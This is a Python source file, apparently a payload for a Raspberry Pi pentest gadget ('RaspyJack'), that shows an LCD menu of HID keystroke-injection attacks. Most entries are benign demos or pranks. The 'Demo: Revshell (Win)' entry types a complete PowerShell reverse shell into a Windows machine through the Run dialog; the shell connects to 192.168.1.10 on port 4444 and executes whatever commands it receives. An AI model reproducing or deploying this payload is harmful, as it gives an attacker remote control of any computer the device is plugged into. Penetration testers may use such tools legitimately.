#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack Launcher**
=============================================
This script executes pre-defined HID attacks (keyboard emulation) using the
underlying P4wnP1 A.L.O.A. system.

It demonstrates how to:
1. Create a menu of different HID attack scripts.
2. Use the 'P4wnP1_cli' utility to run the attacks.
3. Display the status of the attack on the LCD.
4. Exit cleanly on KEY3 press.
"""

# ---------------------------------------------------------------------------
# 0) Imports & boilerplate
# ---------------------------------------------------------------------------
import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# ---------------------------------------------------------------------------
# 1) GPIO mapping (BCM)
# ---------------------------------------------------------------------------
PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    WIDTH, HEIGHT = 128, 128
    FONT = ImageFont.load_default()
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = ImageFont.load_default() # Fallback to default font
    FONT = ImageFont.load_default() # Fallback to default font

# ---------------------------------------------------------------------------
# 3) HID Attack Scripts (Python-native format for hid_helper)
# ---------------------------------------------------------------------------
# Each script is a list of tuples: (command, arg1, arg2, ...)
# Commands: 'type', 'press', 'modifier_key', 'delay'
HID_SCRIPTS = {
    "Test: Hello World": [
        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
        ('type', "notepad"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
        ('type', "Hello from RaspyJack!")
    ],
    "Prank: Rickroll": [
        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
        ('type', "https://www.youtube.com/watch?v=dQw4w9WgXcQ"), ('press', hid_helper.keyboard.enter)
    ],
    "Demo: Revshell (Win)": [
        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.r), ('delay', 0.5),
        ('type', "powershell"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
        ('type', "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),
        ('press', hid_helper.keyboard.enter)
    ],
    "Demo: macOS Popup": [
        ('modifier_key', hid_helper.keyboard.left_gui, hid_helper.keyboard.space), ('delay', 0.5), # Cmd+Space for Spotlight
        ('type', "Terminal"), ('press', hid_helper.keyboard.enter), ('delay', 1.0),
        ('type', 'osascript -e \'display dialog "Hello from RaspyJack!" with icon 1 buttons {"OK"} default button "OK"\''),
        ('press', hid_helper.keyboard.enter)
    ]
}
SCRIPT_NAMES = list(HID_SCRIPTS.keys())

# ---------------------------------------------------------------------------
# 4) Graceful shutdown
# ---------------------------------------------------------------------------
running = True

def cleanup(*_):
    """Signal handler to stop the main loop."""
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# ---------------------------------------------------------------------------
# 5) Core Attack Function
# ---------------------------------------------------------------------------

def run_hid_attack(script_name: str):
    """Executes a HID script using hid_helper."""
    script_actions = HID_SCRIPTS.get(script_name)
    if not script_actions:
        return False

    if not hid_helper.is_hid_gadget_enabled:
        print("ERROR: HID Gadget not enabled. Cannot run HID attack.", file=sys.stderr)
        return False

    try:
        for action in script_actions:
            cmd = action[0]
            args = action[1:]

            if cmd == 'type':
                hid_helper.type_string(args[0])
            elif cmd == 'press':
                hid_helper.press_key(args[0])
            elif cmd == 'modifier_key':
                hid_helper.press_modifier_key(args[0], args[1])
            elif cmd == 'delay':
                time.sleep(args[0])
            else:
                print(f"WARNING: Unknown HID action: {cmd}", file=sys.stderr)
        return True
    except Exception as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        return False

# ---------------------------------------------------------------------------
# 6) UI and Drawing Functions
# ---------------------------------------------------------------------------

def draw_menu(selected_index: int):
    """Draws the attack selection menu."""
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libs not available. Cannot draw menu.", file=sys.stderr)
        return

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    
    d.text((5, 5), "HID Attack Launcher", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    start_index = max(0, selected_index - 2)
    end_index = min(len(SCRIPT_NAMES), start_index + 6)
    
    y_pos = 30
    for i in range(start_index, end_index):
        line = SCRIPT_NAMES[i]
        fill = "yellow" if i == selected_index else "white"
        d.text((5, y_pos), line, font=FONT, fill=fill)
        y_pos += 15

    d.text((5, 110), "OK=Run | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_status(message: str, color: str = "yellow"):
    """Draws a status message on the screen."""
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"STATUS: {message}", file=sys.stderr)
        return

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

# ---------------------------------------------------------------------------
# 7) Main Loop
# ---------------------------------------------------------------------------
try:
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID Launcher.", file=sys.stderr)
        sys.exit(1)

    if not hid_helper.is_hid_gadget_enabled:
        draw_status("HID Gadget NOT\nenabled! See\nupdate_deps.py", "red")
        time.sleep(5)
        sys.exit(1)

    selected_index = 0
    
    while running:
        draw_menu(selected_index)
        
        button_pressed = False
        while not button_pressed and running:
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["UP"]) == 0:
                selected_index = (selected_index - 1) % len(SCRIPT_NAMES)
                button_pressed = True
            elif GPIO.input(PINS["DOWN"]) == 0:
                selected_index = (selected_index + 1) % len(SCRIPT_NAMES)
                button_pressed = True
            elif GPIO.input(PINS["OK"]) == 0:
                script_to_run = SCRIPT_NAMES[selected_index]
                draw_status(f"Running:\n{script_to_run}")
                
                if run_hid_attack(script_to_run):
                    draw_status("Attack finished!", "lime")
                else:
                    draw_status("Attack failed!", "red")
                
                time.sleep(2)
                button_pressed = True

            time.sleep(0.1)
        
        time.sleep(0.2) # Debounce

except (KeyboardInterrupt, SystemExit):
    pass
except Exception as e:
    print(f"[ERROR] {e}", file=sys.stderr)
    draw_status(f"ERROR:\n{str(e)[:20]}", "red")
    time.sleep(3)
finally:
    if HARDWARE_LIBS_AVAILABLE:
        LCD.LCD_Clear()
        GPIO.cleanup()
    print("HID Attack payload finished.")
